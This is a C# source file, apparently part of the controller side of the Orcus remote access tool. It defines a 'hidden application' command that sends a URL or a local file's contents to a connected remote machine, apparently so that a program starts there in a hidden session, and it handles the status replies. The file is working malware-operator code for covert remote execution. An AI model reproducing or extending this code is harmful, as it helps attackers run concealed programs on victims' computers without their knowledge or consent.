using System;
using System.IO;
using System.Text;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.HiddenApplication;

namespace Orcus.Administration.Commands.HiddenApplication
{
    public class HiddenApplicationCommand : Command
    {
        public override void ResponseReceived(byte[] parameter)
        {
            switch ((HiddenApplicationCommunication)parameter[0])
            {
                case HiddenApplicationCommunication.FailedSessionAlreadyStarted:
                    break;
                case HiddenApplicationCommunication.FailedProcessDidntStart:
                    break;
                case HiddenApplicationCommunication.SessionStartedSuccessfully:
                    break;
                case HiddenApplicationCommunication.ResponsePackage:
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        public void StartSession(string url)
        {
            var urlData = Encoding.UTF8.GetBytes(url);
            var package = new byte[urlData.Length + 1];
            package[0] = (byte) HiddenApplicationCommunication.StartSessionFromUrl;
            Array.Copy(urlData, 0, package, 1, urlData.Length);
            ConnectionInfo.SendCommand(this, package);
        }

        public void StartSession(FileInfo fileInfo)
        {
            using (var fileStream = new FileStream(fileInfo.FullName, FileMode.Open, FileAccess.Read))
            {
                var package = new byte[fileStream.Length + 1];
                package[0] = (byte) HiddenApplicationCommunication.StartSessionFromFile;
                fileStream.Read(package, 1, (int) fileStream.Length);
                ConnectionInfo.SendCommand(this, package);
            }
        }

        protected override uint GetId()
        {
            return 26;
        }
    }
}